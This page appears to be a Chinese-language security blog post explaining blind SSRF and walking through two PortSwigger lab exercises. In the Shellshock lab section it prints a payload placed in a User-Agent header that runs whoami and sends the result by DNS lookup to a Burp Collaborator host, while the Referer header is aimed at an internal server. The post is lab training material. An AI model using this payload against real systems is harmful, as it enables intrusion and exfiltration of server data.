@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="What is blind SSRF?当可以使应用程序向提供的URL发出请求，但后端请求的响应未在应用程序的前端返回，就会出现Blind SSRF漏洞。 What is the impact of blind SSRF vulnerabilities?由于响应不可见，Blind SSRF 漏洞的影响通常低于响应可见的 SSRF 漏洞。 不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Blind SSRF">
+<meta property="og:url" content="http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="What is blind SSRF?当可以使应用程序向提供的URL发出请求，但后端请求的响应未在应用程序的前端返回，就会出现Blind SSRF漏洞。 What is the impact of blind SSRF vulnerabilities?由于响应不可见，Blind SSRF 漏洞的影响通常低于响应可见的 SSRF 漏洞。 不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/aH9WCSvT1xXs8D3.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/sTAiHJOdpnPk4I3.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/s4bOoUKcwIhlqT3.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/opvFNb214iOjrzY.png">
+<meta property="article:published_time" content="2023-10-04T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T10:57:16.322Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="WebSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/aH9WCSvT1xXs8D3.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Blind SSRF</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/09/HackTheBox-Networked/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/04/C++%20Multithreading/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&text=Blind SSRF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&is_video=false&description=Blind SSRF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Blind SSRF&body=Check out this article: http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&name=Blind SSRF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&t=Blind SSRF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-blind-SSRF"><span class="toc-number">1.</span> <span class="toc-text">What is blind SSRF?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-the-impact-of-blind-SSRF-vulnerabilities"><span class="toc-number">2.</span> <span class="toc-text">What is the impact of blind SSRF vulnerabilities?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#How-to-find-and-exploit-blind-SSRF-vulnerabilities"><span class="toc-number">3.</span> <span class="toc-text">How to find and exploit blind SSRF vulnerabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-number">4.</span> <span class="toc-text">Example</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Blind-SSRF-with-out-of-band-detection"><span class="toc-number">4.1.</span> <span class="toc-text">Blind SSRF with out-of-band detection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Blind-SSRF-with-Shellshock-exploitation"><span class="toc-number">4.2.</span> <span class="toc-text">Blind SSRF with Shellshock exploitation</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Blind SSRF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-04T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WebSecurity/" rel="tag">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="What-is-blind-SSRF"><a href="#What-is-blind-SSRF" class="headerlink" title="What is blind SSRF?"></a>What is blind SSRF?</h4><p>当可以使应用程序向提供的URL发出请求，但后端请求的响应未在应用程序的前端返回，就会出现Blind SSRF漏洞。</p>
+<h4 id="What-is-the-impact-of-blind-SSRF-vulnerabilities"><a href="#What-is-the-impact-of-blind-SSRF-vulnerabilities" class="headerlink" title="What is the impact of blind SSRF vulnerabilities?"></a>What is the impact of blind SSRF vulnerabilities?</h4><p>由于响应不可见，Blind SSRF 漏洞的影响通常低于响应可见的 SSRF 漏洞。 不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完全远程代码执行。</p>
+<h4 id="How-to-find-and-exploit-blind-SSRF-vulnerabilities"><a href="#How-to-find-and-exploit-blind-SSRF-vulnerabilities" class="headerlink" title="How to find and exploit blind SSRF vulnerabilities"></a>How to find and exploit blind SSRF vulnerabilities</h4><p>检测Blind SSRF 漏洞的最可靠方法是使用OAST技术（out-of-band HTTP request）。 该技术涉及到尝试触发对已知的外部系统的 HTTP 请求，并监视与该系统的网络交互。</p>
+<p>使用OAST技术的最简单和最有效的方法是使用 Burp Collaborator。 可以使用 Burp Collaborator 客户端生成唯一的域名，将这些以有效负载的形式发送到应用程序，并监控与这些域的任何交互。 如果观察到来自应用程序的传入 HTTP 请求，则它容易受到 SSRF 攻击。</p>
+<p>在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域名的 DNS 查找，但没有后续的 HTTP 请求。 这通常是因为应用程序试图向该域名发出 HTTP 请求，这导致了 DNS 查找，但实际的 HTTP 请求被防火墙阻止了。 基础设施允许出站 DNS 流量相对常见，但会阻止非预期域名内的 HTTP 连接。</p>
+<p>简单地识别一个可以触发带外 HTTP 请求的Blind SSRF 漏洞本身并不能提供利用途径，由于无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序可以访问的内部其他系统上的内容。 但是，它仍然可以用来探测服务器本身或其他后端系统上的其他漏洞，黑客可以盲目扫描内部 IP 地址空间，发送旨在检测公开漏洞的payload。 如果这些payload还采用OAST，那么黑客可能会发现未打补丁的内部服务器上的严重漏洞。</p>
+<p>另一种利用Blind SSRF 漏洞的途径是诱导应用程序连接到攻击者控制下的系统，并向建立连接的 HTTP 客户端返回恶意响应。 如果可以利用 HTTP 实现过程中的严重客户端漏洞，就可能能够在应用程序中实现远程代码执行。</p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="Blind-SSRF-with-out-of-band-detection"><a href="#Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Blind SSRF with out-of-band detection"></a>Blind SSRF with out-of-band detection</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</span><br></pre></td></tr></table></figure>
+
+<p>该站点在加载产品页面时获取 Referer 标头中指定的 URL。</p>
+<p>要解决问题，需要使用此功能向Public Burp Collaborator 服务器发出 HTTP 请求。</p>
+<p>正常请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /product?productId=1 HTTP/1.1</span><br><span class="line">Host: 0aef0001041b65dcc37bd2fb0074002f.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Referer: https://0aef0001041b65dcc37bd2fb0074002f.web-security-academy.net/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在burp的左上角打开Burp Collaborator</p>
+<p><a href="https://smms.app/image/aH9WCSvT1xXs8D3" target="_blank"><img src="https://s2.loli.net/2024/01/14/aH9WCSvT1xXs8D3.png" ></a></p>
+<p>然后选择copy to clipboard，将生成的url替换到refer字段</p>
+<p><a href="https://smms.app/image/sTAiHJOdpnPk4I3" target="_blank"><img src="https://s2.loli.net/2024/01/14/sTAiHJOdpnPk4I3.png" ></a></p>
+<p>发送请求之后点击Poll now，看到DNS请求和HTTP请求</p>
+<p><a href="https://smms.app/image/s4bOoUKcwIhlqT3" target="_blank"><img src="https://s2.loli.net/2024/01/14/s4bOoUKcwIhlqT3.png" ></a></p>
+<h5 id="Blind-SSRF-with-Shellshock-exploitation"><a href="#Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Blind SSRF with Shellshock exploitation"></a>Blind SSRF with Shellshock exploitation</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation</span><br></pre></td></tr></table></figure>
+
+<p>该站点在加载产品页面时获取 Referer 标头中指定的 URL。</p>
+<p>目的是使用此功能对192.168.0.X 的内部服务器的8080端口实现Blind SSRF 攻击，对内部服务器使用 Shellshock payload以泄露操作系统用户。</p>
+<p>还是抓请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /product?productId=1 HTTP/1.1</span><br><span class="line">Host: 0a9b00e303dd7c0dc242846400c500cf.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line">...</span><br><span class="line">Referer: https://0a9b00e303dd7c0dc242846400c500cf.web-security-academy.net/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure>
+
+<p>修改后的请求如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /product?productId=1 HTTP/1.1</span><br><span class="line">Host: 0a9b00e303dd7c0dc242846400c500cf.web-security-academy.net</span><br><span class="line">User-Agent: () &#123; :; &#125;; /usr/bin/nslookup $(whoami).lc1p3lkfe0ejg7t9ktrwvjdkibo2cr.burpcollaborator.net</span><br><span class="line">...</span><br><span class="line">Referer: http://192.168.0.1:8080</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>然后扔到intruder模块里，最后看Burp Collaborator client里的DNS请求</p>
+<p><a href="https://smms.app/image/opvFNb214iOjrzY" target="_blank"><img src="https://s2.loli.net/2024/01/14/opvFNb214iOjrzY.png" ></a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-blind-SSRF"><span class="toc-number">1.</span> <span class="toc-text">What is blind SSRF?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-the-impact-of-blind-SSRF-vulnerabilities"><span class="toc-number">2.</span> <span class="toc-text">What is the impact of blind SSRF vulnerabilities?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#How-to-find-and-exploit-blind-SSRF-vulnerabilities"><span class="toc-number">3.</span> <span class="toc-text">How to find and exploit blind SSRF vulnerabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-number">4.</span> <span class="toc-text">Example</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Blind-SSRF-with-out-of-band-detection"><span class="toc-number">4.1.</span> <span class="toc-text">Blind SSRF with out-of-band detection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Blind-SSRF-with-Shellshock-exploitation"><span class="toc-number">4.2.</span> <span class="toc-text">Blind SSRF with Shellshock exploitation</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&text=Blind SSRF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&is_video=false&description=Blind SSRF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Blind SSRF&body=Check out this article: http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&title=Blind SSRF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&name=Blind SSRF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/Blind%20SSRF%E6%BC%8F%E6%B4%9E/&t=Blind SSRF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
